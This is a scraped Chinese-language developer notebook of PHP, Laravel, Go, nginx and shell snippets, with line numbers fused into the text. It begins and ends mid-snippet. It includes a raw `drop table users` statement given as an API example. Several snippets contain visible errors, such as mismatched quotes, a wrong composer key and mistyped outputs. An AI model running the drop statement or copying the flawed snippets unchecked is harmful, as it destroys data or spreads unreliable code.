error: ' . json_last_error_msg() ); &#125; return $data;&#125;https://learnku.com/laravel/t/3553/how-to-read-the-json-data-in-the-response-response-to-guzzle\Guzzle\json_decode( (string) $response-&gt;getBody(), true);GuzzleHttp\Promise是对Promises/A+的一个实现。实现功能有：1.异步链式执行。2.cancel操作(Promise状态仍然处于pending时)3.wait同步链式执行echo 'step1';$promise = new \GuzzleHttp\Promise\Promise();$promise-&gt;resolve('step 3");$promise-&gt;then(function($param)&#123;echo $param;&#125;);echo 'step2';// 执行顺序step1step2step3$promise-&gt;then(function($param)&#123;echo $param; return $param."1";&#125;)-&gt;then(function($param)&#123;echo $param."2";&#125;)-&gt;then(function($param)&#123;echo $param."3";&#125;);echo 'step1';$promise = new \GuzzleHttp\Promise\Promise();$promise-&gt;resolve('step 3");$promise-&gt;then(function($param)&#123;echo $param;&#125;)-&gt;wait();echo 'step2';// 执行顺序https://www.jianshu.com/p/c3bad948a905step1step3 (会阻塞执行，直到step3执行结束才会执行后续的step2)step2promise基本原理是一系列回调函数入队列，而出队列的函数注册到php脚本结束是运行的register_shutdown_function函数中。因此，所有的promise都是入队列，脚本执行结束再执行；如果脚本执行结束之前，有E_ERROR级别错误，promise不会执行。 基于 GD 库生成圆形头像12345678910111213141516171819202122232425262728293031/** * 获取圆 * * @param $imgPath 图片网络路径, 本地路径 * @return resource * @author 19/1/29 CLZ. */ private function _circleImg($imgPath) &#123; $src_img = imagecreatefromjpeg($imgPath); list($w, $h) = getimagesize($imgPath); $w = $h = min($w, $h); $img = imagecreatetruecolor($w, $h); imagesavealpha($img, true); // 拾取一个完全透明的颜色,最后一个参数127为全透明 $bg = imagecolorallocatealpha($img, 255, 255, 255, 127); imagefill($img, 0, 0, $bg); $r = $w / 2; // 圆的半径 for ($x = 0; $x &lt; $w; $x++) &#123; for ($y = 0; $y &lt; $h; $y++) &#123; $rgbColor = imagecolorat($src_img, $x, $y); if (((($x - $r) * ($x - $r) + ($y - $r) * ($y - $r)) &lt; ($r * $r))) imagesetpixel($img, $x, $y, $rgbColor); &#125; &#125; imagedestroy($src_img); return $img; &#125; Laravel 分组获取最新记录1234567891011121314151617//https://learnku.com/articles/20626select * from (select * from project where user_id = :user_id order by id desc) as a group by a.name order by id desc;原因是 5.7 版本 ORDER BY 没有 LIMIT 的时候，少了一个 DERIVED 操作，估计是内部优化了，认为 ORDER BY 在这种语法中可忽略，有 LIMIT 限制涉及排序后的结果，不会忽略 ORDER BY，可以达到预期。select * from (select * from project where user_id = :user_id order by id desc limit 10000) as a group by a.name order by id desc;$limit = $request-&gt;get('limit',10); $user_id = $request-&gt;get('user_id',null); $sub_query = Project::where('user_id',$user_id)-&gt;orderBy('id','desc')-&gt;limit(1000);//子查询 $results = Project::select('*') -&gt;from(DB::raw('('.$sub_query-&gt;toSql().') as a')) //from() 类似与 DB::table(), toSql()得到带 ? 号的执行 sql 语句 -&gt;mergeBindings($sub_query-&gt;getQuery())//mergeBindings() 合并绑定参数,getQuery()获得具体值 -&gt;groupBy('name') -&gt;orderBy('id','desc') -&gt;paginate($limit); return $this-&gt;pageDate($results); 打包exe1234567891011package main#https://segmentfault.com/a/1190000013795920import ( test "github.com/yimogit/gotest")func main() &#123; test.HelloWord()&#125;go get -v github.com/yimogit/gotestgo build -o test.exe laravel读主123456在Model里面加上下面这句，强制读主（写）库数据库，解决主从延迟问题。public static function boot()&#123; //清空从连接,会自动使用主连接 DB::connection()-&gt;setReadPdo(null);&#125; PHP使用Memcached存储Session123456session.save_handler = memcached session.save_path = "localhost:11211" session_start();var_dump(session_id());//vkfc4eefu7ihlu5iv7v3je8rm0 https://php1024.com/posts/50.htmvar_dump(ini_get('memcached.sess_prefix')); // 'memc.sess.key.'get memc.sess.key.vkfc4eefu7ihlu5iv7v3je8rm0 单元测试1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465composer global require "phpunit/phpunit=5.5.*"或者在composer.json文件中声明对phpunit/phpunit的依赖https://php1024.com/posts/15.htm&#123; "require-dev": &#123; "phpunit/phpunit": "5.5.*" &#125;&#125;在tests\unit\MyApiTest.php中定义了两个测试用例&lt;?phpclass MyApiTest extends \PHPUnit_Framework_TestCase&#123; protected $client; public function setUp() &#123; $this-&gt;client = new \GuzzleHttp\Client( [ 'base_uri' =&gt; 'http://myhost.com', 'http_errors' =&gt; false, #设置成 false 来禁用HTTP协议抛出的异常(如 4xx 和 5xx 响应)，默认情况下HTPP协议出错时会抛出异常。 ]); &#125; public function testAction1() &#123; $response = $this-&gt;client-&gt;get('/api/v1/action1'); $body = $response-&gt;getBody(); //添加测试 $this-&gt;assertEquals(200, $response-&gt;getStatusCode()); $data = json_decode($body, true); $this-&gt;assertArrayHasKey('errorno', $data); $this-&gt;assertArrayHasKey('errormsg', $data); $this-&gt;assertArrayHasKey('data', $data); $this-&gt;assertEquals(0, $data['errorno']); $this-&gt;assertInternalType('array', $data['data']); &#125; public function testAction2() &#123; $response = $this-&gt;client-&gt;post('/api/v1/action2', [ 'form_params' =&gt; [ 'name' =&gt; 'myname', 'age' =&gt; 20, ], ]); $body = $response-&gt;getBody(); //添加测试 $this-&gt;assertEquals(200, $response-&gt;getStatusCode()); $data = json_decode($body, true); $this-&gt;assertArrayHasKey('errorno', $data); $this-&gt;assertArrayHasKey('errormsg', $data); $this-&gt;assertArrayHasKey('data', $data); $this-&gt;assertEquals(0, $data['errorno']); $this-&gt;assertInternalType('array', $data['data']); &#125;&#125;运行测试在项目根目录执行命令php vendor/bin/phpunit tests/unit/MyApiTest.php lumen 事务1234567891011121314151617181920212223use Illuminate\Database\Eloquent\ModelNotFoundException;use DB;use App\Models\Article;use App\Models\Comment;use App\Models\Counter;use App\Models\Log;...// 开始事务DB::beginTransaction();try &#123; $id = 5; $article = Article::findOrFail($id); Comment::where('article_id', $id)-&gt;delete(); Counter::where('article_id', $id)-&gt;delete(); Log::insert([ 'content' =&gt; '删除文章：'.$id ]); // 流程操作顺利则commit DB::commit();&#125; catch (ModelNotFoundException $e) &#123; // 抛出异常则rollBack DB::rollBack();&#125; lumen sql123456789101112131415161718192021DB::statement('drop table users');https://segmentfault.com/a/1190000005792605#articleHeader18DB::listen(function($sql, $bindings, $time)&#123; // $query-&gt;sql // $query-&gt;bindings // $query-&gt;time&#125;);$users = DB::connection('foo')-&gt;select(...);$pdo = DB::connection()-&gt;getPdo();DB::beginTransaction();DB::rollback();DB::commit();DB::transaction(function()&#123; DB::table('users')-&gt;update(['votes' =&gt; 1]); DB::table('posts')-&gt;delete();&#125;); xml2array123456789101112131415161718192021222324252627282930//https://learnku.com/articles/22936#f411d0 一个类只做一件事 private static function xml2Array($xml) &#123; if (!static::isXml($xml)) &#123; throw new ResponseNotXMLException(); &#125; function _XML2Array(SimpleXMLElement $parent) &#123; $array = array(); foreach ($parent as $name =&gt; $element) &#123; ($node = &amp;$array[$name]) &amp;&amp; (1 === count($node) ? $node = array($node) : 1) &amp;&amp; $node = &amp;$node[]; $node = $element-&gt;count() ? _XML2Array($element) : trim($element); &#125; return $array; &#125; $xml = new SimpleXMLElement($xml); $data = _XML2Array($xml); return $data; &#125; private static function isXml($xml) &#123; return xml_parse(xml_parser_create(), $xml, true); &#125; 导出Excel12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364//导出说明:因为EXCEL单表只能显示104W数据，同时使用PHPEXCEL容易因为数据量太大而导致占用内存过大，https://blog.csdn.net/Tim_phper/article/details/86636608 //因此，数据的输出用csv文件的格式输出，但是csv文件用EXCEL软件读取同样会存在只能显示104W的情况，所以将数据分割保存在多个csv文件中，并且最后压缩成zip文件提供下载 function putCsv(array $head, $data, $mark = 'attack_ip_info', $fileName = "test.csv") &#123; set_time_limit(0); $sqlCount = $data-&gt;count(); // 输出Excel文件头，可把user.csv换成你要的文件名 header('Content-Type: application/vnd.ms-excel;charset=utf-8'); header('Content-Disposition: attachment;filename="' . $fileName . '"'); header('Cache-Control: max-age=0'); $sqlLimit = 100000;//每次只从数据库取100000条以防变量缓存太大 // 每隔$limit行，刷新一下输出buffer，不要太大，也不要太小 $limit = 100000; // buffer计数器 $cnt = 0; $fileNameArr = array(); // 逐行取出数据，不浪费内存 for ($i = 0; $i &lt; ceil($sqlCount / $sqlLimit); $i++) &#123; $fp = fopen($mark . '_' . $i . '.csv', 'w'); //生成临时文件 // chmod('attack_ip_info_' . $i . '.csv',777);//修改可执行权限 $fileNameArr[] = $mark . '_' . $i . '.csv'; // 将数据通过fputcsv写到文件句柄 fputcsv($fp, $head); $dataArr = $data-&gt;offset($i * $sqlLimit)-&gt;limit($sqlLimit)-&gt;get()-&gt;toArray(); foreach ($dataArr as $a) &#123; $cnt++; if ($limit == $cnt) &#123; //刷新一下输出buffer，防止由于数据过多造成问题 ob_flush(); flush(); $cnt = 0; &#125; fputcsv($fp, $a); &#125; fclose($fp); //每生成一个文件关闭 &#125; //进行多个文件压缩 $zip = new ZipArchive(); $filename = $mark . ".zip"; $zip-&gt;open($filename, ZipArchive::CREATE); //打开压缩包 foreach ($fileNameArr as $file) &#123; $zip-&gt;addFile($file, basename($file)); //向压缩包中添加文件 &#125; $zip-&gt;close(); //关闭压缩包 foreach ($fileNameArr as $file) &#123; unlink($file); //删除csv临时文件 &#125; //输出压缩文件提供下载 header("Cache-Control: max-age=0"); header("Content-Description: File Transfer"); header('Content-disposition: attachment; filename=' . basename($filename)); // 文件名 header("Content-Type: application/zip"); // zip格式的 header("Content-Transfer-Encoding: binary"); // header('Content-Length: ' . filesize($filename)); // @readfile($filename);//输出文件; unlink($filename); //删除压缩包临时文件 &#125;--当你有几百万数据的时候，执行 select from table limit 0, 10 与 select from table limit 1000000, 10 耗时会有明显的差别 你可以查下一offset带来的影响，简单说就是如果你limit 1000000, 10 ，mysql处理的数据实际是1000010条，然后再抛弃1000000，获取后边的10条，所以速度就慢了。 还有一种场景就是当单表条数多时，有经验的开发列表页就不提供分页了，或者只让你查前几十页，不然真有人看几千页以后的数据，数据表受offset影响，返回速度会慢很多。 DB 果然要比 eloquent 方式快很多，正常了 Lumen 使用 throttle 限制接口访问频率12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152https://juejin.im/post/5c41bea8f265da61171cfecf在app\Http\Middleware中新建ThrottleRequests.php文件 内容为 https://github.com/illuminate/routing/blob/master/Middleware/ThrottleRequests.phpprotected function resolveRequestSignature($request)&#123; return sha1( $request-&gt;method() . '|' . $request-&gt;server('SERVER_NAME') . '|' . $request-&gt;path() . '|' . $request-&gt;ip() );&#125;protected function buildException($key, $maxAttempts)&#123; $retryAfter = $this-&gt;getTimeUntilNextRetry($key); $headers = $this-&gt;getHeaders( $maxAttempts, $this-&gt;calculateRemainingAttempts($key, $maxAttempts, $retryAfter), $retryAfter ); // 修改了这一行 return new ThrottleException('Too Many Attempts.', 429);&#125; 在app/Exceptions中新建ThrottleException.php &lt;?php namespace App\Exceptions; use Exception; class ThrottleException extends Exception&#123; protected $isReport = false; public function isReport()&#123; return $this-&gt;isReport; &#125; &#125;app/Exceptions/Handler.php捕获该抛出异常，在render方法增加以下判断if ($exception instanceof ThrottleException) &#123; return response([ 'code' =&gt; $exception-&gt;getCode(), 'msg' =&gt; $exception-&gt;getMessage() ], 429);&#125;在bootstrap/app.php中注册：throttle:10,2表示的是2分钟内访问10次$app-&gt;routeMiddleware([ 'throttle' =&gt; App\Http\Middleware\ThrottleRequests::class,]); $router-&gt;group(['middleware' =&gt; ['throttle:10,2']],function() use ($router)&#123; $router-&gt;post('feedback','UserController@addFeedback');&#125;); db有多个连接123456789101112131415161718192021222324252627282930313233343536373839404142434445门面模式下，laravel会用默认的连接(例如:defaultdb)而不是你认为的mydb。$orm = DB::table('mydb.sale_area') -&gt;leftJoin('mydb.sale_group_relation', 'mydb.sale_area.id', '=', 'mydb.sale_group_relation.child_id');QLSTATE[42000]: Syntax error or access violation: 1142 SELECT command deniedto user 'xxxxx'@'xx.xx.xx.xx' for table 'sale_area'$orm = DB::connection("mydb::read")-&gt;table("sale_area") -&gt;leftJoin('sale_group_relation', 'sale_area.id', '=', 'sale_group_relation.child_id');$orm-&gt;where('sale_area.id', $condition['id']);$orm-&gt;select(['*']);return $orm-&gt;get()-&gt;toArray();class EventServiceProvider extends ServiceProvider &#123; public function boot() &#123; parent::boot(); // 监听事务时触发https://www.jianshu.com/p/c8f703d0ce5a Event::listen(ConnectionEvent::class, function ($event)&#123; Log::info(ConnectionEvent::class, $event-&gt;connection-&gt;getConfig()); &#125;); // 监听日志记录的db操作 Event::listen(QueryExecuted::class, function ($event)&#123; Log::info(QueryExecuted::class, [ 'connection'=&gt;$event-&gt;connection-&gt;getConfig(), 'sql' =&gt; $event-&gt;sql, 'time' =&gt; $event-&gt;time, 'bindings' =&gt; $event-&gt;bindings, ]); &#125;); // 监听PdoStatement操作 Event::listen(StatementPrepared::class, function ($event) &#123; ob_start(); $event-&gt;statement-&gt;debugDumpParams(); $dump = ob_get_clean(); Log::info(StatementPrepared::class, [ 'connection'=&gt;$event-&gt;connection-&gt;getConfig(), 'debugDumpParams' =&gt; $dump, 'errorCode' =&gt; $event-&gt;statement-&gt;errorCode(), 'errorInfo' =&gt; $event-&gt;statement-&gt;errorInfo(), 'queryString' =&gt; $event-&gt;statement-&gt;queryString, ]); &#125;); &#125;&#125; 闭包基本用法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869PHP 中传递对象时，默认是以引用传递所以在闭包内操作 use 传递的对象时需要特别注意https://www.0php.net/posts/PHP-Clourse-%E9%97%AD%E5%8C%85%E7%B1%BB-%E6%B5%85%E6%9E%90.htmlclass Dog &#123; public $name = 'Wang Cai';&#125;$dog = new Dog();$changeName = function () use ($dog) &#123; $dog-&gt;name = 'Lai Fu';&#125;;$changeName();echo $dog-&gt;name;// 输出 Lai Fu$clourse = function () &#123; echo 'hello clourse';&#125;;if (is_object($clourse)) &#123; echo get_class($clourse);&#125;// 输出 Closureclass Pandas &#123; public $num = 1;&#125;$pandas = new Pandas();$add = function () &#123; echo ++$this-&gt;num . PHP_EOL;&#125;;$newAdd1 = $add-&gt;bindTo($pandas);$newAdd1();// 输出 2$newAdd2 = Closure::bind($add, $pandas);$newAdd2();// 输出 3如果将 Pandas 类的 $num 属性改写为 protected 或 private 则会抛出一个致命错误！class Pandas &#123; protected $num = 1;&#125;$pandas = new Pandas();$add = function () &#123; echo ++$this-&gt;num . PHP_EOL;&#125;;$newAdd1 = $add-&gt;bindTo($pandas, $pandas);$newAdd1();// 输出 2$newAdd2 = Closure::bind($add, $pandas, 'Pandas');$newAdd2();// 输出 3class Pandas &#123; protected $num = 1;&#125;$pandas = new Pandas();$add = function ($num) &#123; $this-&gt;num += $num; echo $this-&gt;num . PHP_EOL;&#125;;$add-&gt;call($pandas, 5);// 输出 6 nginx 配置文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103# 指定运行 nginx 的用户# 格式：user 用户名 [用户组];user www www;# nginx 的工作进程数# 格式：worker_processes 进程数;worker_processes 4;# pid 文件的存放路径# 格式：pid 文件路径;pid logs/nginx.pid;# 指定错误日志文件存放路径# 格式：error_log 文件路径 [错误级别];# 错误级别包括：DEBUG | info | notice | warn | error | crit | alert | emergerror_log logs/logs.log warn;# 指定 worker 进程打开文件最大数目限制# 格式：worker_rlimit_nofile 最大打开文件数;worker_rlimit_nofile 10000;events &#123; # 指定每个 worker 进程同时打开的最大连接数 # 格式：worker_connections 最大连接数; # 此值不能大于操作系统支持的打开的最大文件句柄数 worker_connections 1024; # 设置是否允许同时接受多个连接 # 格式：multi_accept on|off; multi_accept on; # 设置事件驱动模型 # 格式：use 事件驱动模型; # 可填内容：select | poll | kqueue | epoll | rtsig | /dev/poll | eventport # 推荐使用 use epoll; use epoll;&#125;http &#123; # 引入「文件扩展名与文件类型映射表」的配置文件 include mime.types; # 指定默认HTTP 响应的 Content-Type 值 # 格式：default_type type; default_type text/plain; # 指定连接日志格式 # 格式：log_format 格式名 格式字符串; log_format myFormat '$remote_addr–$remote_user [$time_local] $request $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for'; # 指定连接日志文件存放路径 # 格式：access_log 存放文件路径 日志格式; access_log logs/access_logs.log myFormat; # 指定连接超时时间 # 格式：keepalive_timeout 超时秒数 keepalive_timeout 60; # 指定是否使用sendfile系统调用来传输文件 # 格式:sendfile on|off; # 推荐开启 sendfile on; server &#123; # 指定 server 监听的端口 # 格式：listen 端口号; listen 80; # 指定 server 主机名，支持域名、IP，可以使用通配符或正则表达式，支持多个 # 格式：server_name 主机名...; server_name www.0php.net; # 指定站点目录 # 格式：root 目录名; root /www/public; # 指定默认页面，可多个，优先匹配第一个存在的 # 格式：index 文件名...; index index.html index.htm index.php; # location 块 # 格式： location [=|~|~*|^~] 正则表达式 &#123;...&#125; location ~ [^/]\.php(/|$) &#123; # 指定 fastcgi 代理 # 格式：fastcgi_pass fastcgi地址 fastcgi_pass 127.0.0.1:9000; # 指定 fastcgi 默认请求文件 # 格式：fastcgi_index 默认请求文件 fastcgi_index index.php; # 引入 fastcgi 的配置文件 include fastcgi.conf; &#125; # 其它 location 均未匹配则会匹配此块 location / &#123; # 找指定路径下文件，如果不存在，则转给后面的文件执行 # 格式：try_files 文件路径...; try_files $uri $uri/ /index.php?$query_string; &#125; &#125;&#125; try catch12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455function foo()&#123; if (random_int(0, 1)) &#123; throw new RuntimeException('I am RuntimeException'); &#125; else &#123; throw new OutOfRangeException('I am OutOfRangeException'); &#125;&#125;try &#123; foo();&#125; catch (OutOfRangeException|RuntimeException $e) &#123; echo $e-&gt;getMessage();&#125;// 根据随机抛出的异常分别输出// I am RuntimeException// I am OutOfRangeException全局异常处理函数set_exception_handler(function (Exception $e) &#123; echo $e-&gt;getMessage();&#125;);function foo()&#123; throw new Exception('nobody catch me');&#125;foo();// 输出 nobody catch mefunction foo(int $a): int&#123; return $a;&#125;try &#123; foo('string');&#125; catch (Throwable $e) &#123; echo get_class($e);//TypeError &#125;// 输出 Throwable Throwable 是 PHP 7 新出的一个预定义接口，Error 和 Exception 类都实现了这个接口，也就是说我们现在有能力通过 catch 捕获到 Errorfunction foo()&#123; try &#123; throw new Exception(); return 1; &#125; catch (Exception $e) &#123; return 2; &#125; finally &#123; return 3; &#125;&#125;echo foo();// 输出 3 https://www.0php.net/posts/PHP-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E4%B8%89%E8%BF%9E-try-catch-finally.htmlfinally 内的代码是无论是否捕获到异常都会执行的代码，并且当 finally 中存在 return 返回值时，整个try..catch...finally段的返回值只会是 finally 的返回值。 忽略 include 的输出123456789101112131415ob_start();include 'file.php';ob_end_clean();输出缓冲区的作用是将 PHP 的输出内容缓存在一块内存中，当缓冲区的内存满了或者程序执行完毕后便会将缓冲区的内容发送给客户端。 https://www.0php.net/posts/PHP-%E8%BE%93%E5%87%BA%E7%BC%93%E5%86%B2%E5%8C%BA%E5%BA%94%E7%94%A8.htmlob_start();echo 'world';$str = ob_get_clean();echo 'hello ' . $str;// 输出 hello world$str1 = "good"; $str2 = "good\0bad"; var_dump(strcoll($str1, $str2));// 非二进制安全，输出 0var_dump(strcmp($str1, $str2));// 二进制安全，输出 -4 在二进制安全的函数操作里 \0 并不会看做字符串的结尾，字符串中所有的数据都没有特殊的含义。 https://www.0php.net/posts/PHP-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B8%E5%85%B3%E5%B8%B8%E8%AF%86.html 中间件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061$allMiddleware = function () &#123; echo 'start middleware2' . PHP_EOL; (function () &#123; echo 'start middleware1' . PHP_EOL; // app (function () &#123; echo 'app' . PHP_EOL; &#125;)(); // end app echo 'end middleware1' . PHP_EOL; &#125;)(); echo 'end middleware2' . PHP_EOL;&#125;;$allMiddleware();// 输出https://www.0php.net/posts/PHP-%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%9E%E7%8E%B0.html// start middleware2// start middleware1// app// end middleware1// end middleware2$db = function ($request, Closure $next) &#123; echo '成功建立数据库连接' . PHP_EOL; $response = $next($request); echo '成功关闭数据库连接' . PHP_EOL; return $response;&#125;;$like = function ($request, Closure $next) &#123; echo '点赞+1' . PHP_EOL; $response = $next($request); echo '点赞+2' . PHP_EOL; return $response;&#125;;$app = function ($request) &#123; echo $request . PHP_EOL; return '一个无聊的返回值';&#125;;$allMiddleware = [$like, $db];$next = $app;foreach ($allMiddleware as $middleware) &#123; $next = function ($request) use ($middleware, $next) &#123; return $middleware($request, $next); &#125;;&#125;// array_reduce 实现$allMiddleware = [$like, $db];$go = array_reduce($allMiddleware, function ($next, $middleware) &#123; return function () use ($next, $middleware) &#123; $middleware($next); &#125;;&#125;, $app);$go();$response = $next('O(∩_∩)O');echo $response; php数组函数1234567891011121314151617181920212223242526272829303132333435363738//composer require zane/utils dev-master$data = [6, 11, 11, 2, 4, 4, 11, 6, 7, 4, 2, 11, 8];$cv = array_count_values($data);// $cv = [6 =&gt; 2, 11 =&gt; 4, 2 =&gt; 2, 4 =&gt; 3, 7 =&gt; 1, 8 =&gt; 1]arsort($cv);$max = key($cv);var_dump($max);// 结果 11$power = ['read' =&gt; true, 'write' =&gt; true, 'execute' =&gt; true];var_dump((bool)array_product($power));// 结果 true$power = ['read' =&gt; true, 'write' =&gt; true, 'execute' =&gt; false];var_dump((bool)array_product($power));// 结果 false$power = ['read' =&gt; true, 'write' =&gt; true, 'execute' =&gt; 'true'];var_dump((bool)array_product($power));// 结果 false$input = ['foo', false, -1, null, '', []];var_dump(array_filter($input));// 结果 [0 =&gt; 'foo', 2 =&gt; -1]$input = [0 =&gt; 233, 99 =&gt; 666];var_dump(array_values($input));// 结果 [0 =&gt; 233, 1 =&gt; 66] 不止重置数字索引还会将字符串键名也同样删除并重置input = ['hello' =&gt; 'world', 0 =&gt; 233, 99 =&gt; 666];var_dump(array_slice($input, 0));// 结果 ['hello' =&gt; 'world', 0 =&gt; 233, 1 =&gt; 66]$raw = ['id' =&gt; 1, 'name' =&gt; 'zane', 'password' =&gt; '123456'];// 用 PHP 内置函数实现function removeKeys($array, $keys) &#123; return array_diff_key($array, array_flip($keys));&#125;// 移除 id 键 https://www.0php.net/posts/%E5%B7%A7%E7%94%A8-PHP-%E6%95%B0%E7%BB%84%E5%87%BD%E6%95%B0.htmlvar_dump(removeKeys($raw, ['id', 'password']));// 结果 ['name' =&gt; 'zane']$input = ['you are' =&gt; 666, 'i am' =&gt; 233, 'he is' =&gt; 233, 'she is' =&gt; 666];$result = array_flip(array_flip($input));var_dump($result);// 结果 ['she is' =&gt; 666, 'he is' =&gt; 233] 浮点数精确度1234567891011121314151617181920214.35-4.34等于0.0099999999999998// 设置默认小数点保留位数bcscale(2);// 加法echo bcadd(1234567890.123, 987654321987654321), PHP_EOL;// 减法https://learnku.com/articles/23967echo bcsub(1234567890.123, 987654321987654321), PHP_EOL;// 乘法echo bcmul(1234567890.123, 987654321987654321), PHP_EOL;// 除法，指定保留小数后20位，否则小数点不够结果会是0echo bcdiv(1234567890.123, 987654321987654321, 20), PHP_EOL;或者这时候、你需要对比两个数值的大小范围、我建议你这样做，使用bccomp('1.00','1.00',2)比较两个数字的大小 windows换行符转换1sed -i 's/\r//' build.sh &amp;&amp; bash build.sh 控制字符检测12345678910$strings = array('string1' =&gt; "\n\r\t", 'string2' =&gt; 'arf12');foreach ($strings as $name =&gt; $testcase) &#123; if (ctype_cntrl($testcase)) &#123; echo "The string '$name' consists of all control characters.\n"; &#125; else &#123; echo "The string '$name' does not consist of all control characters.\n"; &#125;&#125;var_dump(checkdate(12, 31, 2000)); // 输出：bool(true)var_dump(checkdate(2, 29, 2001)); // 输出：bool(false) 匿名函数123456789101112131415161718192021222324252627282930313233343536373839404142434445class Order&#123; private $orderId = '001'; private static $defaultMoney = '100'; public $num = 1;&#125;$getOrderId = function() &#123; return $this-&gt;orderId;&#125;;$getNum = function() &#123; return $this-&gt;num;&#125;;$getDefaultMoney = static function() &#123; return Order::$defaultMoney;&#125;;$getDefaultMoney1 = Closure::bind($getDefaultMoney, null, Order::class);// 输出：100$getOrderId1 = Closure::bind($getOrderId, null, Order::class);// 输出:PHP Fatal error: Uncaught Error: Using $this when not in object context$getNum1 = Closure::bind($getNum, null, Order::class);// 输出:PHP Fatal error: Uncaught Error: Using $this when not in object context$getDefaultMoney2 = Closure::bind($getDefaultMoney, new Order(), Order::class);// 输出：PHP Warning: Cannot bind an instance to a static closure$getOrderId2 = Closure::bind($getOrderId, new Order(), Order::class);// 输出 string(3) "001"$getNum2 = Closure::bind($getNum, new Order(), Order::class);// 输出 int(1)$getDefaultMoney3 = Closure::bind($getDefaultMoney, new Order());// 输出 PHP Warning: Cannot bind an instance to a static closure$getOrderId3 = Closure::bind($getOrderId, new Order());// 输出 Fatal error: Uncaught Error: Cannot access private property Order::$orderId$getNum3 = Closure::bind($getNum, new Order());// 输出 int(1)$getOrderId1 = $getOrderId-&gt;bindTo(new Order(), Order::class); Laravel 辅助函数12345678910111213141516composer.json的autoload下加"autoload": &#123; "classmap": [ "database" ], "psr-4": &#123; "App\\": "app/" &#125;, "file": [ "app/helpers.php" ]&#125;,然后再运行以下命令进行重新加载文件即可： $ composer dump-autoload go结构体自定义排序123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package mainimport ( "fmt" "sort")type userInfo struct &#123; Uid int64 //uid Score int64 //分数 Rank int //排名&#125;type Score []userInfofunc (s Score) Len() int &#123; return len(s) &#125;func (s Score) Swap(i, j int) &#123; s[i], s[j] = s[j], s[i] &#125;func (s Score) Less(i, j int) bool &#123; return s[i].Score &gt; s[j].Score &#125; // 从大到小排序func main() &#123; users := []userInfo&#123;&#125; scores := []int64&#123;2, 3, 4, 4, 5, 8, 8, 9, 1, 10,1&#125; fmt.Println(scores) for i := 1; i &lt;= 10; i++ &#123; users = append(users, userInfo&#123; Uid: int64(i), Score: scores[i], &#125;) &#125; sort.Sort(Score(users)) fmt.Printf("%+v \n",users) res := ReckonRank(users) for _,v := range res &#123; fmt.Printf("user %+v \n",v) &#125;&#125;func ReckonRank(users []userInfo) (usersInfo []userInfo) &#123; index := 0 //排名 var lastScore int64 //上一次分数 usersInfo = make([]userInfo, 0) for _, user := range users &#123; if user.Score != lastScore &#123; index ++ lastScore = user.Score &#125; usersInfo = append(usersInfo, userInfo&#123; Uid: user.Uid, Score: user.Score, Rank: index, &#125;) &#125; return&#125; api签名1234567891011121314151617181920212223242526272829303132333435363738394041424344//https://github.com/larvacent/laravel-auth-signature-guard/blob/master/src/SignatureGuard.php//验证公共请求参数 if (!$request-&gt;has('app_id')) &#123; throw new AuthenticationException('Missing app_id parameter.'); &#125; if (!$request-&gt;has('timestamp')) &#123; throw new AuthenticationException('Missing timestamp parameter.'); &#125; if (!$request-&gt;has('signature')) &#123; throw new AuthenticationException('Missing signature parameter.'); &#125; if (!$request-&gt;has('signature_method')) &#123; throw new AuthenticationException('Missing signature_method parameter.'); &#125; if (!$request-&gt;has('signature_nonce')) &#123; throw new AuthenticationException('Missing signature_nonce parameter.'); &#125; //获取参数 $params = $request-&gt;except(['signature']); //检查时间戳，误差1分钟 if ((time() - intval($params['timestamp'])) &gt; 60) &#123; throw new AuthenticationException('Client time is incorrect.'); &#125; //获取有效的 Client if (($client = $this-&gt;clients-&gt;findActive($params['app_id'])) == null) &#123; throw new AuthenticationException('App_id is incorrect.'); &#125; if ($request-&gt;input('signature') != $this-&gt;getSignature($params, $client-&gt;secret)) &#123; throw new AuthenticationException('Signature verification failed'); &#125; protected function getSignature(array $params, $key) &#123; //参数排序 ksort($params); $stringToSign = urlencode(http_build_query($params, null, '&amp;', PHP_QUERY_RFC3986)); //签名 if ($params['signature_method'] == self::SIGNATURE_METHOD_HMACSHA256) &#123; return base64_encode(hash_hmac('sha256', $stringToSign, $key, true)); &#125; elseif ($params['signature_method'] == self::SIGNATURE_METHOD_HMACSHA1) &#123; return base64_encode(hash_hmac('sha1', $stringToSign, $key, true)); &#125; throw new AuthenticationException('This signature method is not supported.'); &#125; PHP数组扁平化1234567891011121314151617181920212223242526272829$data = [ 'testArray' =&gt; [ 'string1', 'string2', [ 'string1', 'string2', ], ], 'teststring'];echo "&lt;pre&gt;";https://learnku.com/articles/24318print_r(iterator_to_array( new RecursiveIteratorIterator( new RecursiveArrayIterator($data) ), false // use_keys:默认true ));/*Array( [0] =&gt; string1 [1] =&gt; string2 [2] =&gt; string1 [3] =&gt; string2 [4] =&gt; teststring)*/ ffmpeg123456yum install ffmpeg自动批量合并视频文件https://github.com/kashu/merge.videos https://www.5yun.org/8224.htmlffmpeg -i "工程师的痛只有工程师能懂_高清-XNzE1NTk3Mzky_part1.flv" -c copy -bsf:v h264_mp4toannexb -f mpegts 1.tsffmpeg -i "工程师的痛只有工程师能懂_高清-XNzE1NTk3Mzky_part2.flv" -c copy -bsf:v h264_mp4toannexb -f mpegts 2.tsffmpeg -i "concat:1.ts|2.ts" -c copy -bsf:a aac_adtstoasc "工程师的痛只有工程师能懂.mp4" 1752年9月2日的后面竟然是14日1234567[root@su ~]# cal 9 1752 September 1752Su Mo Tu We Th Fr Sa 1 2 14 15 1617 18 19 20 21 22 2324 25 26 27 28 29 30https://tonydeng.github.io/2006/03/28/A-Linux-command-a-human-civilization/ 批量转换文件编码1234567891011121314#!/bin/bashDIR=$1 # 转换编码文件目录FT=$2 # 需要转换的文件类型（扩展名）SE=$3 # 原始编码DE=$4 # 目标编码for file in `find $DIR -type f -name 